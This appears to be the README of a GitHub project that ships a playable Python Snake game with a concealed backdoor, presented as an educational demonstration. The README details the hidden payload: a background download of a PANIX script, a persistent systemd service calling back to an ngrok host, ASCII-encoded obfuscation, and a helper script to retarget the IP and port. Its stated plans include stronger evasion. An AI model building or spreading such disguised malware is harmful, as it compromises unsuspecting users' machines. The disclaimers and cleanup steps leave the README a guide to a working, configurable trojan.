# SPY - Snake Plays You 🎮🐍

**Play in/with Linux**

Author: Hasan Malek  
GitHub: [Hasan-Malek](https://github.com/Hasan-Malek)  
LinkedIn: [Hasan Malek](https://linkedin.com/in/hasan-malek-125036297)  

---

## 📖 About

Welcome to **SPY (Snake Plays You)**! 🐍 This project is a fully functional **terminal-based Snake game** written in Python, but with a twist—it’s also a powerful **educational demonstration** of how attackers can hide malicious payloads in seemingly harmless programs. 😈

Here’s the idea:
- You download a fun Snake game from GitHub. 🎮
- It runs smoothly, letting you chase food and rack up points. 🏆
- But **in the background**, it silently downloads a script, sets up a persistent systemd service, and connects to a remote server—all without you noticing! 😱

This project uses the [PANIX repository](https://github.com/Aegrah/PANIX) to deliver a backdoor, showing how phishing and software supply-chain attacks can compromise Linux systems (Debian, Arch, Fedora, etc.). It’s designed to **raise awareness** about the dangers of running untrusted code. 🚨

**This is for EDUCATIONAL PURPOSES ONLY.** It’s meant to teach cybersecurity concepts, not to harm systems. Test it in a safe environment like a virtual machine! 🛡️

---

## 🚨 Disclaimer

> ⚠️ This repository is for **educational purposes only**.  
> Do **NOT** use it for malicious purposes.  
> The code demonstrates hidden payloads for **research and teaching** only.  
> Always test in a sandbox or virtual machine with no network access.  

I am **not responsible** for any misuse of this code. 🙅‍♂️

---

## 🎮 Snake Game

The Snake game is a classic! Use arrow keys to move, eat food to grow, and avoid crashing into walls or yourself. Press `Q` to quit or `R` to restart after a game over. It’s built with Python’s `curses` library for a slick terminal experience. 🖥️

Run it with:

```bash
python3 snake.py
```

But beware—while you’re playing, the script is secretly doing more... 😈

---

## 🕵️‍♂️ The Hidden Payload

Here’s what happens behind the scenes:
1. **Download**: The script grabs `panix.sh` from [PANIX](https://github.com/Aegrah/PANIX/releases/download/panix-v2.1.0/panix.sh) and saves it as `/tmp/syshealth-:0-CFYhrx.zsh.sh`.
2. **Execution**: It makes the file executable and runs it with arguments to set up a systemd user service (`~/.config/systemd/user/syshealth.service`).
3. **Persistence**: The service connects to a remote server (`0.tcp.in.ngrok.io:17532`) and stays active, even if you delete `snake.py` or the downloaded script. 😱
4. **Obfuscation**: The payload is hidden with:
   - ASCII-encoded strings (URL, file path, command). 🔢
   - Name mangling (e.g., `__x7z9q__` function). 🕵️
   - Fake comments to blend with game logic. 📝
   - Silent execution in a background thread. 🤫

This shows how attackers can disguise malicious code in fun apps, packages, or updates. It’s a wake-up call to **always verify code** before running it! 🔍

---

## 🛠️ Prerequisites

To run the Snake game and payload:
- **Python 3.6+**: All modules (`curses`, `random`, `time`, `sys`, `os`, `shutil`, `subprocess`, `threading`, `enum`) are in the Python standard library. No `requirements.txt` needed! 🐍
- **System Dependencies**: You need `curl` or `wget` for the download:
  ```bash
  sudo apt install curl  # Debian/Ubuntu
  sudo yum install curl  # Red Hat/CentOS
  ```
- **Systemd**: The target system must support systemd user services (most modern Linux distros do).
- **Terminal**: A terminal with at least 20x10 size for the game.

---

## 🚀 Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Hasan-Malek/SPY.git
   cd SPY
   ```
2. Check for `curl` or `wget`:
   ```bash
   curl --version || wget --version
   ```
3. Run the game:
   ```bash
   python3 snake.py
   ```

**WARNING**: Running `snake.py` will execute the payload. Test only in a **virtual machine** or sandbox with no network access! 🛡️

---

## 🔧 Modifying the Payload

Want to change the IP or port in the payload? Use `decode_p3.sh` to decode the command and generate a new ASCII-encoded string:

```bash
./decode_p3.sh <new_ip> <new_port>
```

This outputs a new `_p3` line to replace in `snake.py`. Edit the file manually to update the payload. For example:

```bash
./decode_p3.sh 1.tcp.in.ngrok.io 12345
```

Then copy the output into `snake.py`’s `__x7z9q__` function. 🔧

---

## 🕹️ How to Play

- **Start**: Press any key (or `1`, `2`, `3` for Easy, Medium, Hard difficulty).
- **Move**: Use arrow keys to control the snake.
- **Eat**: Collect food (`π`) to grow and score points (+10 per food).
- **Quit**: Press `Q` to exit.
- **Restart**: Press `R` after a game over.

While you play, the payload runs silently in the background. 😈

---

## 🔒 Obfuscation Techniques

To hide the payload, the script uses:
- **ASCII Encoding**: Strings like the URL and command are stored as ASCII character lists (e.g., `[104,116,116,112,115,...]` for `https`).
- **Name Mangling**: The payload function is named `__x7z9q__` to look cryptic.
- **Fake Comments**: Comments like “Terminal playground snake logic” mislead readers.
- **Background Thread**: The payload runs without delaying the game.
- **Silent Execution**: Output is redirected to `/dev/null` for stealth.

These make it hard to spot the malicious code without deep analysis. 🕵️‍♂️

---

## 🧪 Testing Safely

To test this project safely:
1. Set up a **virtual machine** (e.g., VirtualBox, VMware) with no internet access.
2. Install Python 3.6+ and `curl`/`wget`.
3. Run `python3 snake.py` and play the game.
4. Check the payload’s effects:
   ```bash
   ls /tmp/syshealth-:0-CFYhrx.zsh.sh
   ls ~/.config/systemd/user/syshealth.service
   systemctl --user status syshealth.service
   ```
5. Clean up after testing:
   ```bash
   systemctl --user disable --now syshealth.service
   rm -f ~/.config/systemd/user/syshealth.service
   rm -f /tmp/syshealth-:0-CFYhrx.zsh.sh
   ```

---

## 📚 Educational Purpose

This project is perfect for:
- **Cybersecurity Workshops**: Show how phishing works in a controlled setting.
- **Linux Security Training**: Teach about untrusted code and persistence.
- **Code Analysis**: Study obfuscation and payload delivery techniques.

It demonstrates real-world attack vectors like:
- Disguising malware in games, updates, or tools. 🎮
- Using systemd for persistence. 🛠️
- Obfuscating code to evade detection. 🔒

**Always use ethically** and with permission from system owners. 🙏

---

## 📂 Files

- `snake.py`: The Snake game with the hidden payload.
- `decode_p3.sh`: A script to decode and modify the payload’s IP/port.

---

## 🌟 Future Improvements

- Add command-line arguments for dynamic IP/port configuration.
- Randomize file and service names to evade detection.
- Use stronger obfuscation (e.g., XOR encryption, PyArmor).
- Include a cleanup script for ethical demos.
- Test on more distros (e.g., Ubuntu, Arch, Fedora).

---

## 🙌 Contributing

Got ideas to make this demo even better? Open an issue or submit a pull request on [GitHub](https://github.com/Hasan-Malek/SPY)! Let’s improve cybersecurity education together. 🚀

---

## 📜 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

## ⚠️ Final Warning

This code is a **demonstration of vulnerabilities**, not a tool for harm. Always test in a safe environment and respect ethical boundaries. Stay curious, stay safe! 🔒

---

**Created by Hasan Malek**  
Happy learning, and don’t let the snake play you! 🐍